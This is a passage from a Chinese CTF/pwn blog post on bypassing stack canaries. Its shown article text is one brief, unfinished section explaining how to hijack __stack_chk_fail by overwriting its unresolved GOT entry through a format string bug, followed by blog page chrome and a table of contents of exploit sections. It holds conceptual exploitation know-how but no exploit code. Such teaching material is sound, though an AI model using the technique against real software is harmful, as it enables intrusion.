<h2 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持_stack_chk_fail函数"></a>劫持_stack_chk_fail函数</h2><p>这是一种很常见的漏洞利用方法，通过格式化字符串等漏洞修改got表劫持函数，触发报错时执行该函数转而执行构造的exp。但这种技术并不是我们一般方式的hijack GOT表，一般我们hijack GOT表是因为GOT表绑定了真实地址，我们覆盖他让程序执行其他函数。GOT表中要绑定真实地址必须是执行过一次，然而<code>__stack_chk_fail()</code>函数执行第一次的时候就会报错退出，所以我们需要overwrite的尚未执行过的<code>__stack_chk_fail()</code>的GOT表项，此时GOT表中应该存储<code>stack_chk_fail PLT[1]</code>的地址</p>
<p>（待补充）</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Blu3m00n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://whitegive111.github.io/2022/09/13/Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">https://whitegive111.github.io/2022/09/13/Canary的几种绕过方式/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://whitegive111.github.io" target="_blank">Blu3m00n's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://www.giaott.com/images/2022/09/13/dC0dZ.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2Write%20up/"><img class="next-cover" src="https://www.giaott.com/images/2022/08/17/OXFs9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022巅峰极客</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://www.giaott.com/images/2022/08/14/OMxzS.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Blu3m00n</div><div class="author-info__description">一个不懂安全的陇茗</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">Canary是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8GCC%E4%B8%AD%E4%BD%BF%E7%94%A8Canary"><span class="toc-number">1.2.</span> <span class="toc-text">在GCC中使用Canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">Canary实现原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Leak%E8%A6%86%E7%9B%96"><span class="toc-number">2.</span> <span class="toc-text">Leak覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#canary"><span class="toc-number">2.2.1.</span> <span class="toc-text">canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">2.2.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mary-Morton"><span class="toc-number">2.2.3.</span> <span class="toc-text">Mary_Morton</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">逐字节爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">3.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bin"><span class="toc-number">3.2.1.</span> <span class="toc-text">bin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.2.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP-leak"><span class="toc-number">4.</span> <span class="toc-text">SSP  leak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">4.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#readme"><span class="toc-number">4.2.1.</span> <span class="toc-text">readme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">4.2.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#guess"><span class="toc-number">4.2.3.</span> <span class="toc-text">guess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-4"><span class="toc-number">4.2.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">劫持_stack_chk_fail函数</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/13/Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" title="栈溢出之Canary"><img src="https://www.giaott.com/images/2022/09/13/dC0dZ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="栈溢出之Canary"/></a><div class="content"><a class="title" href="/2022/09/13/Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" title="栈溢出之Canary">栈溢出之Canary</a><time datetime="2022-09-13T11:42:57.801Z" title="发表于 2022-09-13 19:42:57">2022-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2Write%20up/" title="2022巅峰极客"><img src="https://www.giaott.com/images/2022/08/17/OXFs9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022巅峰极客"/></a><div class="content"><a class="title" href="/2022/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2Write%20up/" title="2022巅峰极客">2022巅峰极客</a><time datetime="2022-08-17T15:28:22.024Z" title="发表于 2022-08-17 23:28:22">2022-08-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/03/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%E6%98%8E/" title="简单的说明"><img src="https://www.giaott.com/images/2022/08/14/OM2sc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="简单的说明"/></a><div class="content"><a class="title" href="/2022/05/03/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%E6%98%8E/" title="简单的说明">简单的说明</a><time datetime="2022-05-03T06:22:13.283Z" title="发表于 2022-05-03 14:22:13">2022-05-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://www.giaott.com/images/2022/09/13/dC0dZ.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 By Blu3m00n</div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>